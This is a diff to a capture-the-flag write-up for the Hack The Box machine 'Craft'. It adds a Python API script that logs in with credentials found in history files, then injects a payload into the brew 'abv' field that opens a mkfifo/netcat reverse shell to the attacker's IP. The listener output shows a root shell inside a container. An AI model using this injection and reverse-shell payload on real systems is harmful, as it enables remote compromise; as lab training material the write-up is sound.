@@ -116,13 +116,16 @@ img
 
 searching for test discloses a script for connecting to the api, and looking through the history files reveals the initial creds used:
 
+
+the script is copied to kali and a payload is inserted into the abv parameter
+
 ```python
 #!/usr/bin/env python
 
 import requests
 import json
 
-response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
 json_response = json.loads(response.text)
 token =  json_response['token']
 
@@ -149,14 +152,58 @@ print(response.text)
 # create a sample brew with real ABV... should succeed.
 print("Create real ABV brew")
 brew_dict = {}
-brew_dict['abv'] = '0.15'
+brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.74 4444 >/tmp/f')"
 brew_dict['name'] = 'bullshit'
 brew_dict['brewer'] = 'bullshit'
 brew_dict['style'] = 'bullshit'
 
 json_data = json.dumps(brew_dict)
 response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
-print(response.text)
+print(response.text)                                                                                                                    
+```
+
+## Shell
+
+```
+nc -lvnp 4444            
+listening on [any] 4444 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.163.136] 35495
+/bin/sh: can't access tty; job control turned off
+/opt/app # python3 -c 'import pty; pty.spawn("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/local/lib/python3.6/pty.py", line 156, in spawn
+    os.execlp(argv[0], *argv)
+  File "/usr/local/lib/python3.6/os.py", line 542, in execlp
+    execvp(file, args)
+  File "/usr/local/lib/python3.6/os.py", line 559, in execvp
+    _execvpe(file, args)
+  File "/usr/local/lib/python3.6/os.py", line 583, in _execvpe
+    exec_func(file, *argrest)
+FileNotFoundError: [Errno 2] No such file or directory
+/opt/app # whoami
+root
+/opt/app # env
+HOSTNAME=5a3d243127f5
+PYTHON_PIP_VERSION=19.0.1
+SHLVL=2
+HOME=/root
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.6.8
+PWD=/opt/app
+/opt/app # ls -la
+total 32
+drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
+drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
+drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
+-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
+-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
+drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
+-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
+drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
+
 ```
 
 ---
